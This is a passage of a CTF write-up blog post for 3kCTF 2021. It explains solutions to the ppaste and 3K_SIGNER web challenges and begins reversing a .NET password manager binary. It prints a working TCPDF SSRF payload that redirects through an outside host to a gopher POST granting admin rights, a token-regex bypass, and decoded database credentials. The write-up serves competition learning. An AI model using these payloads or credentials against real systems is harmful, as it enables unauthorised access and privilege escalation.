<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#66d9ef">foreach</span> ($data[<span style="color:#e6db74">&#39;d&#39;</span>] <span style="color:#66d9ef">as</span> $key <span style="color:#f92672">=&gt;</span> $value) {
    <span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">strlen</span>($value)<span style="color:#f92672">&lt;</span><span style="color:#ae81ff">4</span>) <span style="color:#a6e22e">puts</span>(<span style="color:#ae81ff">0</span>);
}</code></pre></div>
<p>Then we changed the payload to negative infinity like <code>-3e333</code> and managed to bypass the restriction.</p>

<p>For the TCPDF part, we have to review the source code, which is unpleasantly long:</p>

<p><a href="https://raw.githubusercontent.com/the3000org/3kCTF2021/master/web/ppaste/source/www/TCPDF/tcpdf.php">https://raw.githubusercontent.com/the3000org/3kCTF2021/master/web/ppaste/source/www/TCPDF/tcpdf.php</a></p>

<p>and my computer crashes when I view in Github directly. 🥳</p>

<p>Anyway, the vulnerability is in the <code>getHtmlDomArray</code> function:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#66d9ef">protected</span> <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">getHtmlDomArray</span>($html) {
    <span style="color:#75715e">// array of CSS styles ( selector =&gt; properties).
</span><span style="color:#75715e"></span>    $css <span style="color:#f92672">=</span> <span style="color:#66d9ef">array</span>();
    <span style="color:#75715e">// get CSS array defined at previous call
</span><span style="color:#75715e"></span>    $matches <span style="color:#f92672">=</span> <span style="color:#66d9ef">array</span>();
    <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">preg_match_all</span>(<span style="color:#e6db74">&#39;/&lt;cssarray&gt;([^\&lt;]*)&lt;\/cssarray&gt;/isU&#39;</span>, $html, $matches) <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">0</span>) {
        <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">isset</span>($matches[<span style="color:#ae81ff">1</span>][<span style="color:#ae81ff">0</span>])) {
            $css <span style="color:#f92672">=</span> <span style="color:#a6e22e">array_merge</span>($css, <span style="color:#a6e22e">json_decode</span>($this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">unhtmlentities</span>($matches[<span style="color:#ae81ff">1</span>][<span style="color:#ae81ff">0</span>]), <span style="color:#66d9ef">true</span>));
        }
        $html <span style="color:#f92672">=</span> <span style="color:#a6e22e">preg_replace</span>(<span style="color:#e6db74">&#39;/&lt;cssarray&gt;(.*?)&lt;\/cssarray&gt;/isU&#39;</span>, <span style="color:#e6db74">&#39;&#39;</span>, $html);
    }
    <span style="color:#75715e">// extract external CSS files
</span><span style="color:#75715e"></span>    $matches <span style="color:#f92672">=</span> <span style="color:#66d9ef">array</span>();
    <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">preg_match_all</span>(<span style="color:#e6db74">&#39;/&lt;link([^\&gt;]*)&gt;/isU&#39;</span>, $html, $matches) <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">0</span>) {
        <span style="color:#66d9ef">foreach</span> ($matches[<span style="color:#ae81ff">1</span>] <span style="color:#66d9ef">as</span> $key <span style="color:#f92672">=&gt;</span> $link) {
            $type <span style="color:#f92672">=</span> <span style="color:#66d9ef">array</span>();
            <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">preg_match</span>(<span style="color:#e6db74">&#39;/type[\s]*=[\s]*&#34;text\/css&#34;/&#39;</span>, $link, $type)) {
                $type <span style="color:#f92672">=</span> <span style="color:#66d9ef">array</span>();
                <span style="color:#a6e22e">preg_match</span>(<span style="color:#e6db74">&#39;/media[\s]*=[\s]*&#34;([^&#34;]*)&#34;/&#39;</span>, $link, $type);
                <span style="color:#75715e">// get &#39;all&#39; and &#39;print&#39; media, other media types are discarded
</span><span style="color:#75715e"></span>                <span style="color:#75715e">// (all, braille, embossed, handheld, print, projection, screen, speech, tty, tv)
</span><span style="color:#75715e"></span>                <span style="color:#66d9ef">if</span> (<span style="color:#66d9ef">empty</span>($type) <span style="color:#66d9ef">OR</span> (<span style="color:#a6e22e">isset</span>($type[<span style="color:#ae81ff">1</span>]) <span style="color:#66d9ef">AND</span> (($type[<span style="color:#ae81ff">1</span>] <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;all&#39;</span>) <span style="color:#66d9ef">OR</span> ($type[<span style="color:#ae81ff">1</span>] <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;print&#39;</span>)))) {
                    $type <span style="color:#f92672">=</span> <span style="color:#66d9ef">array</span>();
                    <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">preg_match</span>(<span style="color:#e6db74">&#39;/href[\s]*=[\s]*&#34;([^&#34;]*)&#34;/&#39;</span>, $link, $type) <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">0</span>) {
                        <span style="color:#75715e">// read CSS data file
</span><span style="color:#75715e"></span>                        $cssdata <span style="color:#f92672">=</span> <span style="color:#a6e22e">TCPDF_STATIC</span><span style="color:#f92672">::</span><span style="color:#a6e22e">fileGetContents</span>(<span style="color:#a6e22e">trim</span>($type[<span style="color:#ae81ff">1</span>]));
                        <span style="color:#66d9ef">if</span> (($cssdata <span style="color:#f92672">!==</span> <span style="color:#66d9ef">FALSE</span>) <span style="color:#66d9ef">AND</span> (<span style="color:#a6e22e">strlen</span>($cssdata) <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">0</span>)) {
                            $css <span style="color:#f92672">=</span> <span style="color:#a6e22e">array_merge</span>($css, <span style="color:#a6e22e">TCPDF_STATIC</span><span style="color:#f92672">::</span><span style="color:#a6e22e">extractCSSproperties</span>($cssdata));
                        }
                    }
                }
            }
        }
    }</code></pre></div>
<p>Interestingly, the parsing for the link tag <code>&lt;link type=&quot;text/css&quot; href=&quot;somefile.css&quot;&gt;</code> does not require the space in between. So <code>&lt;linktype=&quot;text/css&quot;href=&quot;somefile.css&quot;&gt;</code> also works. And <code>TCPDF_STATIC::fileGetContents</code> will call curl eventually:</p>

<p><a href="https://github.com/the3000org/3kCTF2021/blob/13d2e0cbc694da51d31339166ee2182665586381/web/ppaste/source/www/TCPDF/include/tcpdf_static.php#L1898">https://github.com/the3000org/3kCTF2021/blob/13d2e0cbc694da51d31339166ee2182665586381/web/ppaste/source/www/TCPDF/include/tcpdf_static.php#L1898</a></p>

<p>Great we got SSRF! The payload to verify it is <code>&lt;linktype=&quot;text/css&quot;href=&quot;http://webhook&quot;&gt;</code>. You should see the <code>User-Agent</code> is <code>tc-lib-file</code>.</p>

<p>Then I try to leak the information downloaded as a part of CSS, which will be stored in a special tag <code>&lt;cssarray&gt;</code> later. It looks possible to leak the flag because of the flag format:</p>

<p><figure><img src="https://i.imgur.com/Bb286QR.png" alt=""></figure></p>

<p>Later we found that there is a function in the internal service to set a user's privilege to admin:</p>
<pre tabindex="0"><code class="language-python=" data-lang="python=">@app.route(&#39;/users&#39;, methods=[&#39;GET&#39;, &#39;POST&#39;])
def users():
    if request.method == &#39;POST&#39;:
        myJson = json.loads(request.data)
        if(myJson[&#39;user&#39;]):
        	qDB(&#34;UPDATE users SET priv=not(priv) WHERE user=? &#34;,&#34;setAdmin&#34;,myJson[&#39;user&#39;])
        	return json.dumps(True)
        else:
        	return json.dumps(False)
    return json.dumps(qDB(&#34;SELECT user,priv FROM users&#34;))</code></pre>
<p>But it requires POST... After a while I found the curl used before will accept redirection:</p>

<p><a href="https://github.com/the3000org/3kCTF2021/blob/13d2e0cbc694da51d31339166ee2182665586381/web/ppaste/source/www/TCPDF/include/tcpdf_static.php#L1969">https://github.com/the3000org/3kCTF2021/blob/13d2e0cbc694da51d31339166ee2182665586381/web/ppaste/source/www/TCPDF/include/tcpdf_static.php#L1969</a></p>

<p>So we can use the redirect trick to SSRF a gopher to POST in internal service. Then I spent some significant time to handcraft the payload and got it wrong several times because of the encoding issue 🙈.</p>

<p>Anyway here is the final payload to put in the note's title:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html">&lt;<span style="color:#f92672">linktype</span><span style="color:#960050;background-color:#1e0010">=&#34;</span><span style="color:#a6e22e">text</span><span style="color:#960050;background-color:#1e0010">/</span><span style="color:#a6e22e">css</span><span style="color:#960050;background-color:#1e0010">&#34;</span><span style="color:#a6e22e">href</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;http://poc.mm2.in/302.php?1=gopher%3A%2F%2F127.0.0.1%3A8082%2F_POST%2520%2Fusers%2520HTTP%2F1.1%250d%250aContent-type%3A%2520application%2Fjson%250d%250aContent-length%3A%252019%250d%250aHost%3A%2520127.0.0.1%3A8082%250d%250a%250d%250a%7B%22user%22%3A%22USERNAME%22%7D%250d%250a&#34;</span>&gt;</code></pre></div>
<p>Then generate a pdf for this note will trigger SSRF, and then visit the admin page will get the flag.</p>

<h2 id="3ksigner-web-495-points">3K_SIGNER (Web; 495 points)<a hidden class="anchor" aria-hidden="true" href="#3ksigner-web-495-points">#</a></h2>

<p>Solved by <em>ozetta</em>.</p>

<p>This challenge got a lot of unpleasant API calls. So I write some fetches:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-javascript" data-lang="javascript"><span style="color:#75715e">// Registration
</span><span style="color:#75715e"></span><span style="color:#a6e22e">fetch</span>(<span style="color:#e6db74">&#39;/register&#39;</span>,{<span style="color:#a6e22e">method</span><span style="color:#f92672">:</span><span style="color:#e6db74">&#39;POST&#39;</span>,<span style="color:#a6e22e">headers</span><span style="color:#f92672">:</span>{<span style="color:#e6db74">&#39;Content-type&#39;</span><span style="color:#f92672">:</span><span style="color:#e6db74">&#39;application/json&#39;</span>},<span style="color:#a6e22e">body</span><span style="color:#f92672">:</span><span style="color:#a6e22e">JSON</span>.<span style="color:#a6e22e">stringify</span>(
    {<span style="color:#a6e22e">name</span><span style="color:#f92672">:</span><span style="color:#e6db74">&#34;1&#34;</span>,<span style="color:#a6e22e">password</span><span style="color:#f92672">:</span><span style="color:#e6db74">&#34;2&#34;</span>}
)}).<span style="color:#a6e22e">then</span>(<span style="color:#a6e22e">x</span>=&gt;<span style="color:#a6e22e">x</span>.<span style="color:#a6e22e">text</span>()).<span style="color:#a6e22e">then</span>(<span style="color:#a6e22e">x</span>=&gt;<span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#a6e22e">x</span>))

<span style="color:#75715e">// Login
</span><span style="color:#75715e"></span><span style="color:#a6e22e">fetch</span>(<span style="color:#e6db74">&#39;/login&#39;</span>,{<span style="color:#a6e22e">method</span><span style="color:#f92672">:</span><span style="color:#e6db74">&#39;POST&#39;</span>,<span style="color:#a6e22e">headers</span><span style="color:#f92672">:</span>{<span style="color:#e6db74">&#39;Content-type&#39;</span><span style="color:#f92672">:</span><span style="color:#e6db74">&#39;application/json&#39;</span>,<span style="color:#e6db74">&#39;Authorization&#39;</span><span style="color:#f92672">:</span><span style="color:#e6db74">&#39;Basic &#39;</span><span style="color:#f92672">+</span><span style="color:#a6e22e">btoa</span>(<span style="color:#e6db74">&#39;1:2&#39;</span>)},<span style="color:#a6e22e">body</span><span style="color:#f92672">:</span><span style="color:#a6e22e">JSON</span>.<span style="color:#a6e22e">stringify</span>(
    {<span style="color:#a6e22e">name</span><span style="color:#f92672">:</span><span style="color:#e6db74">&#34;1&#34;</span>,<span style="color:#a6e22e">password</span><span style="color:#f92672">:</span><span style="color:#e6db74">&#34;2&#34;</span>}
)}).<span style="color:#a6e22e">then</span>(<span style="color:#a6e22e">x</span>=&gt;<span style="color:#a6e22e">x</span>.<span style="color:#a6e22e">text</span>()).<span style="color:#a6e22e">then</span>(<span style="color:#a6e22e">x</span>=&gt;<span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#a6e22e">x</span>))

<span style="color:#75715e">// Call API with token
</span><span style="color:#75715e"></span><span style="color:#a6e22e">fetch</span>(<span style="color:#e6db74">&#39;/users&#39;</span>,{<span style="color:#a6e22e">method</span><span style="color:#f92672">:</span><span style="color:#e6db74">&#39;GET&#39;</span>,<span style="color:#a6e22e">headers</span><span style="color:#f92672">:</span>{<span style="color:#e6db74">&#39;Content-type&#39;</span><span style="color:#f92672">:</span><span style="color:#e6db74">&#39;application/json&#39;</span>,<span style="color:#e6db74">&#39;Authorization&#39;</span><span style="color:#f92672">:</span><span style="color:#e6db74">&#39;Basic &#39;</span><span style="color:#f92672">+</span><span style="color:#a6e22e">btoa</span>(<span style="color:#e6db74">&#39;1:2&#39;</span>),<span style="color:#e6db74">&#39;x-access-tokens&#39;</span><span style="color:#f92672">:</span><span style="color:#e6db74">&#39;eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJwdWJsaWNfaWQiOiJmZmZkYzgzOS01YzJhLTQ1OTMtYWUxMy01Mzk1YjNNjYwODciLCJleHAiOjE2MjExMzczNDN9.mceCURiA0IuRWfVbgxvfYvSKgmLQDC-Di0DE1mzBdsQ&#39;</span>}}).<span style="color:#a6e22e">then</span>(<span style="color:#a6e22e">x</span>=&gt;<span style="color:#a6e22e">x</span>.<span style="color:#a6e22e">text</span>()).<span style="color:#a6e22e">then</span>(<span style="color:#a6e22e">x</span>=&gt;<span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#a6e22e">x</span>))</code></pre></div>
<p>The objective is to call <code>sign_pdf</code> to trigger <code>unoconv</code>. But how to get a signed token without admin right? <em>Mystiz</em> got a good eyesight on the checking function instead:</p>
<pre tabindex="0"><code class="language-python=" data-lang="python=">reg = re.compile(&#34;[0-9a_f]{32}\Z&#34;, re.I)
def check_valid_token(intoken):
  if bool(reg.match(intoken)):
    rez=Tokens.query.filter(Tokens.token.ilike(intoken)).first()
    print(rez)
    if rez:
      return True
    else:
      return False
  else:
    return False</code></pre>
<p>For some unknown reason it uses case-insensitive like for checking and the regular expression contains <code>_</code>. So <code>'_'*32</code> would be a valid token.</p>

<p>Now we can play with the converter. This is similar to my previous challenges <a href="https://github.com/ozetta/ctf-challenges/wiki/LibVOrifice">LibVOrifice</a> and <a href="https://github.com/ozetta/ctf-challenges/tree/master/2020/ConversionCenter">Conversion Center</a>. Apparently the old payload <code>=WEBSERVICE()</code> did not work. To exploit <code>unoconv</code> we can refer to this more recent research<sup class="footnote-ref" id="fnref:buerhaus"><a class="footnote" href="#fn:buerhaus">11</a></sup>. The Postscript payload seems not working, but the OLE Object xLinking works well.</p>

<p>I later on found that the CTF was ending soon (less than 30 minutes left) after I solved the challenge. That makes me look like flag hoarding, but no 🤫.</p>

<p><figure><img src="https://i.imgur.com/bD2BN4H.png" alt=""></figure></p>

<p>Our teammates were working on Password Manager, and almost got the flag (missed one character). When they saw the bot message they thought their challenge was solved, but no 😒.</p>

<h2 id="password-manager-reverse-493-points">Password Manager (Reverse; 493 points)<a hidden class="anchor" aria-hidden="true" href="#password-manager-reverse-493-points">#</a></h2>

<p>Solved by <em>Mystiz</em>, <em>harrier</em> and <em>cdemirer</em>.</p>

<p>We are given an archive file with <code>password_manager.exe</code>, <code>log.dat</code> and a bunch of <code>.dll</code> files. As a slightly seasoned reverse engineer, we knew <code>password_manager.exe</code> is the file the challenge. <em>harrier</em> searched about the <code>.dll</code>s online and found <code>Renci.SshNet.dll</code> is a .NET library for SSH - which he implied that the binary is written in .NET.</p>

<h3 id="part-i-getting-started">Part I. Getting Started<a hidden class="anchor" aria-hidden="true" href="#part-i-getting-started">#</a></h3>

<p>Since no one is working on this challenge, I decided to have a try on the challenge because I think .NET is not difficult to play with. To begin, I spun up my dusted Windows machine and load the binary with <em>dnSpy</em>. The <code>taskQuals</code> namespace caught my attention. For example, this is part of the <code>eval_c</code> inside the namespace:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-csharp" data-lang="csharp"><span style="color:#75715e">// Token: 0x0600002C RID: 44 RVA: 0x00003F10 File Offset: 0x00002110
</span><span style="color:#75715e"></span><span style="color:#66d9ef">private</span> <span style="color:#66d9ef">void</span> eval_c(<span style="color:#66d9ef">object</span> A_0, EventArgs A_1)
{
  <span style="color:#66d9ef">int</span> a_ = <span style="color:#ae81ff">14</span>;
  <span style="color:#66d9ef">short</span> num = (<span style="color:#66d9ef">short</span>)<span style="color:#ae81ff">1021706240</span>;
  <span style="color:#66d9ef">int</span> num2 = (<span style="color:#66d9ef">int</span>)num;
  <span style="color:#66d9ef">switch</span> (num2)
  {
  <span style="color:#66d9ef">default</span>:
  {
    num = (<span style="color:#66d9ef">short</span>)<span style="color:#ae81ff">2018443264</span>;
    <span style="color:#75715e">// Omitted...
</span><span style="color:#75715e"></span>    <span style="color:#66d9ef">for</span> (;;)
    {
      <span style="color:#75715e">// Omitted...
</span><span style="color:#75715e"></span>      <span style="color:#66d9ef">switch</span> (num2)
      {
      <span style="color:#75715e">// Omitted...
</span><span style="color:#75715e"></span>      <span style="color:#66d9ef">case</span> <span style="color:#ae81ff">15</span>:
      {
        <span style="color:#66d9ef">string</span> text4 = Form1.b(<span style="color:#e6db74">&#34;鯇迉胋词鏏蛑ﳕ볙껛뇝跟싡&#34;</span>, a_);
        <span style="color:#66d9ef">char</span> value3;
        text4 = text4 + Conversions.ToString(value3) + Form1.b(<span style="color:#e6db74">&#34;&#34;</span>, a_);
        MySqlCommand mySqlCommand = <span style="color:#66d9ef">new</span> MySqlCommand(text4, mySqlConnection);
        text += Convert.ToString(RuntimeHelpers.GetObjectValue(mySqlCommand.ExecuteScalar()));
        num = (<span style="color:#66d9ef">short</span>)<span style="color:#ae81ff">1661272070</span>;
        num2 = (<span style="color:#66d9ef">int</span>)((IntPtr)num);
        <span style="color:#66d9ef">continue</span>;
      }
      <span style="color:#75715e">// Omitted...
</span><span style="color:#75715e"></span>      }
      IL_24B:
      text5 = Form1.b(<span style="color:#e6db74">&#34;꫇ꯉ꿋꫍뗏듑돓뻕뇗냙럛닝跟賡诣雥駧飩鿫髭藯蓱菳軵臷胹뷻볽䏿䘁䄃䀅伇䈉䔋䐍嬏帑夓堕圗䨙䴛䰝猟瘡焣瀥缧爩甫琭&#34;</span>, a_);
      text2 = Form1.b(<span style="color:#e6db74">&#34;﯉ﻋ﷍﷛﷝쓟쟡싣쳥엧쇩싫틭컯쿱듳짵&#34;</span>, a_);
      dictionary = <span style="color:#66d9ef">new</span> Dictionary&lt;<span style="color:#66d9ef">string</span>, <span style="color:#66d9ef">string</span>&gt;();
      dictionary.Add(Form1.b(<span style="color:#e6db74">&#34;&#34;</span>, a_), Form1.b(<span style="color:#e6db74">&#34;&#34;</span>, a_));
      dictionary.Add(Form1.b(<span style="color:#e6db74">&#34;&#34;</span>, a_), Form1.b(<span style="color:#e6db74">&#34;&#34;</span>, a_));
      <span style="color:#75715e">// Omitted...
</span><span style="color:#75715e"></span>      dictionary.Add(Form1.b(<span style="color:#e6db74">&#34;&#34;</span>, a_), Form1.b(<span style="color:#e6db74">&#34;&#34;</span>, a_));
      dictionary.Add(Form1.b(<span style="color:#e6db74">&#34;裇&#34;</span>, a_), Form1.b(<span style="color:#e6db74">&#34;難&#34;</span>, a_));
      <span style="color:#66d9ef">string</span> connectionString = Form1.b(<span style="color:#e6db74">&#34;믇꿉뻋룍뗏ꃑ헟쳡틣헥웧틩퓫헭藯臱釳蓵엷釹駻賽狿洁㼃戅椇縉洋氍焏愑焓⬕猗缙眛┝借䴡嘣別ᔧᤩἫḭدऱ䐳圵䬷䤹䬻儽㈿♁祃ⵅⵇ㡉㹋⅍歏&#34;</span>, a_);
      mySqlConnection = <span style="color:#66d9ef">new</span> MySqlConnection(connectionString);
      mySqlConnection.Open();
      <span style="color:#66d9ef">string</span> text6 = <span style="color:#66d9ef">this</span>.input.Text;
      <span style="color:#75715e">// Omitted...
</span><span style="color:#75715e"></span>    }
    <span style="color:#66d9ef">return</span>;
    IL_B0:
    value2 = Form1.b(<span style="color:#e6db74">&#34;诇韛볋韍뷏&#34;</span>, a_);
    num = (<span style="color:#66d9ef">short</span>)<span style="color:#ae81ff">185991170</span>;
    num2 = (<span style="color:#66d9ef">int</span>)((IntPtr)num);
    <span style="color:#66d9ef">goto</span> IL_59;
  }
  }
}</code></pre></div>
<p>It seemed to me that the program is obfuscated in a similar way <em>Layer</em> did - <code>num2</code> is the state and it controls the code block to be executed by <code>switch</code>. There are some interesting snippets, for instance, the below snippet should result in connecting to a MySQL database:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-csharp" data-lang="csharp"><span style="color:#66d9ef">string</span> connectionString = Form1.b(<span style="color:#e6db74">&#34;믇꿉뻋룍뗏ꃑ헟쳡틣헥웧틩퓫헭藯臱釳蓵엷釹駻賽狿洁㼃戅椇縉洋氍焏愑焓⬕猗缙眛┝借䴡嘣別ᔧᤩἫḭدऱ䐳圵䬷䤹䬻儽㈿♁祃ⵅⵇ㡉㹋⅍歏&#34;</span>, a_);
mySqlConnection = <span style="color:#66d9ef">new</span> MySqlConnection(connectionString);
mySqlConnection.Open();</code></pre></div>
<p>As suggested, the gibberish inside <code>Form1.b</code> should represent a connection string. Let's look at the function.</p>

<h3 id="part-ii-what-is-form1b-hiding">Part II. What is <code>Form1.b</code> hiding?<a hidden class="anchor" aria-hidden="true" href="#part-ii-what-is-form1b-hiding">#</a></h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-csharp" data-lang="csharp"><span style="color:#75715e">// Token: 0x06000039 RID: 57 RVA: 0x00005844 File Offset: 0x00003A44
</span><span style="color:#75715e"></span><span style="color:#66d9ef">internal</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">string</span> b(<span style="color:#66d9ef">string</span> A_0, <span style="color:#66d9ef">int</span> A_1)
{
  <span style="color:#66d9ef">char</span>[] array = A_0.ToCharArray();
  <span style="color:#66d9ef">int</span> num = (<span style="color:#66d9ef">int</span>)((IntPtr)(<span style="color:#ae81ff">1681160370</span> + A_1) + (IntPtr)<span style="color:#ae81ff">15</span> + (IntPtr)<span style="color:#ae81ff">52</span> + (IntPtr)<span style="color:#ae81ff">59</span> + (IntPtr)<span style="color:#ae81ff">39</span> + (IntPtr)<span style="color:#ae81ff">98</span>);
  <span style="color:#66d9ef">int</span> num3;
  <span style="color:#66d9ef">int</span> num2;
  <span style="color:#66d9ef">if</span> ((num2 = (num3 = <span style="color:#ae81ff">0</span>)) &lt; <span style="color:#ae81ff">1</span>)
  {
    <span style="color:#66d9ef">goto</span> IL_6A;
  }
  IL_37:
  <span style="color:#66d9ef">int</span> num5;
  <span style="color:#66d9ef">int</span> num4 = num5 = num2;
  <span style="color:#66d9ef">char</span>[] array2 = array;
  <span style="color:#66d9ef">int</span> num6 = num5;
  <span style="color:#66d9ef">char</span> c = array[num5];
  <span style="color:#66d9ef">byte</span> b = (<span style="color:#66d9ef">byte</span>)((<span style="color:#66d9ef">int</span>)(c &amp; <span style="color:#ae81ff">0xff</span>) ^ num++);
  <span style="color:#66d9ef">byte</span> b2 = (<span style="color:#66d9ef">byte</span>)((<span style="color:#66d9ef">int</span>)(c &gt;&gt; <span style="color:#ae81ff">8</span>) ^ num++);
  <span style="color:#66d9ef">byte</span> b3 = b2;
  b2 = b;
  b = b3;
  array2[num6] = (<span style="color:#66d9ef">ushort</span>)((<span style="color:#66d9ef">int</span>)b2 &lt;&lt; <span style="color:#ae81ff">8</span> | (<span style="color:#66d9ef">int</span>)b);
  num3 = num4 + <span style="color:#ae81ff">1</span>;
  IL_6A:
  <span style="color:#66d9ef">if</span> ((num2 = num3) &gt;= array.Length)
  {
    <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">string</span>.Intern(<span style="color:#66d9ef">new</span> <span style="color:#66d9ef">string</span>(array));
  }
  <span style="color:#66d9ef">goto</span> IL_37;
}</code></pre></div>
<p>The above C# code has the same logic to the below Python function. Hence, we are able to decode the strings they obfuscated.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">form_a</span>(x, b):
  offset <span style="color:#f92672">=</span> b<span style="color:#f92672">+</span><span style="color:#ae81ff">185</span>

  output <span style="color:#f92672">=</span> []
  <span style="color:#66d9ef">for</span> j, xc <span style="color:#f92672">in</span> enumerate(x):
    output<span style="color:#f92672">.</span>append(((ord(xc)<span style="color:#f92672">&gt;&gt;</span><span style="color:#ae81ff">8</span>) <span style="color:#f92672">^</span> (offset<span style="color:#f92672">+</span><span style="color:#ae81ff">2</span><span style="color:#f92672">*</span>j<span style="color:#f92672">+</span><span style="color:#ae81ff">1</span>)) <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xff</span>)

  <span style="color:#66d9ef">return</span> bytes(output)<span style="color:#f92672">.</span>decode()</code></pre></div>
<p>For example, the connection string they used to connect to the MySQL server is decoded into below. We are now able to connect to the database ourselves!</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">server=159.65.63.88;user=kerro;database=kek;port=3306;password=kerro;</code></pre></div>
<h3 id="part-iii-databaseasaencryption-service">Part III. Database-as-a-Encryption Service<a hidden class="anchor" aria-hidden="true" href="#part-iii-databaseasaencryption-service">#</a></h3>

<p>After connected to the database, I found that there are 52 tables, namely, <code>a</code>, <code>b</code>, ..., <code>z</code>, <code>A</code>, <code>B</code>, ..., <code>Z</code>. Interestingly, there is only one row in each of the tables. For example,</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">mysql&gt; select * from a;
+------+
| cont |
+------+
| e    |
+------+
1 row in set (0.24 sec)

mysql&gt; select * from b;
+------+
| cont |
+------+
| f    |
+------+
1 row in set (0.18 sec)</code></pre></div>
<p>It looks like a rotation on characters. From my sampled queries, I guess their corresponding input-output pairs are:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">INPUT  | abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ
OUTPUT | efghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!#$%</code></pre></div>
<p>They are added to the <code>dictionary</code>. There are a number of key-value pairs being added to the dictionary. These are the pairs in the dictionary:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">INPUT  | abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!#$%&amp;*-+.&lt;&gt;=@?0123456789
OUTPUT | efghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!#$%&amp;*-+.&lt;&gt;=@?0123456789abcd</code></pre></div>
<p>After all, it is a ROT-4 cipher in the given character set - and the database is served as a part of the encryption mapping.</p>

<div class="alert info">
  <strong>Where is this used?</strong> We will see.
</div>
  

<h3 id="part-iv-recovering-the-additional-binaries">Part IV. Recovering the additional binaries<a hidden class="anchor" aria-hidden="true" href="#part-iv-recovering-the-additional-binaries">#</a></h3>

<p>From the code, we have traces about a new binary is constructed and written to <code>file1.exe</code>:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-csharp" data-lang="csharp">binary_1 = <span style="color:#66d9ef">new</span> <span style="color:#66d9ef">byte</span>[] { <span style="color:#ae81ff">77</span>, <span style="color:#ae81ff">90</span>, <span style="color:#ae81ff">144</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">3</span>, <span style="color:#75715e">/* ...omitted... */</span> <span style="color:#ae81ff">116</span>, <span style="color:#ae81ff">32</span>, <span style="color:#ae81ff">98</span>, <span style="color:#ae81ff">101</span> };
binary_2 = File.ReadAllBytes(<span style="color:#e6db74">&#34;./log.dat&#34;</span>);
<span style="color:#66d9ef">byte</span>[] final_array = binary_1.Concat(binary_2).ToArray&lt;<span style="color:#66d9ef">byte</span>&gt;();
<span style="color:#66d9ef">global</span>::eval_c.eval_a.FileSystem.WriteAllBytes(<span style="color:#e6db74">&#34;./file1.exe&#34;</span>, final_binary, <span style="color:#66d9ef">true</span>);</code></pre></div>
<p>Since <code>log.dat</code> is attached, we are able to reconstruct <code>file1.exe</code> ourselves. There is a curious function in <code>file1.exe</code> when opened with IDA Pro: <code>sub_1400013F0</code>. It is a huge function, but most of the operations are simply value assignments:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#66d9ef">int</span> <span style="color:#66d9ef">__cdecl</span> <span style="color:#a6e22e">sub_1400013F0</span>(<span style="color:#66d9ef">int</span> argc, <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">**</span>argv, <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">**</span>envp)
{
